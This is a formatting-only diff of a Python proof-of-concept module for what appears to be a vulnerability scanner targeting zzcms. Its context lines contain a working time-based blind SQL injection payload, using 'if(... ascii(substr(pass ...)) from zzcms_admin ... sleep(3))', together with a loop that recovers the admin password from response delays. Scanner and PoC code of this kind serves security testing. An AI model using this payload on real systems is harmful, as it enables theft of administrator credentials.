@@ -40,9 +40,10 @@ class Poc(ABPoc):
                 }
             }
         }
-                    
+
     def verify(self):
-        self.target = self.target.rstrip('/') + '/' + (self.get_option('base_path').lstrip('/'))
+        self.target = self.target.rstrip(
+            '/') + '/' + (self.get_option('base_path').lstrip('/'))
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
@@ -85,7 +86,8 @@ class Poc(ABPoc):
             self.output.info('执行异常{}'.format(e))
 
     def exploit(self):
-        self.target = self.target.rstrip('/') + '/' + (self.get_option('base_path').lstrip('/'))
+        self.target = self.target.rstrip(
+            '/') + '/' + (self.get_option('base_path').lstrip('/'))
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
@@ -112,11 +114,11 @@ class Poc(ABPoc):
                     data = {
                         'id': '0 or if((select ascii(substr(pass,{},1)) from zzcms_admin)={},sleep(3),0)'.format(i, j)
                     }
-                    #print data
+                    # print data
                     r = s.post(url, data=data, cookies=cookies)
-                    #print r.text
+                    # print r.text
                     sec = r.elapsed.seconds
-                    #print i,j,sec
+                    # print i,j,sec
                     if sec > 2:
                         flag += chr(j)
                         print(flag)
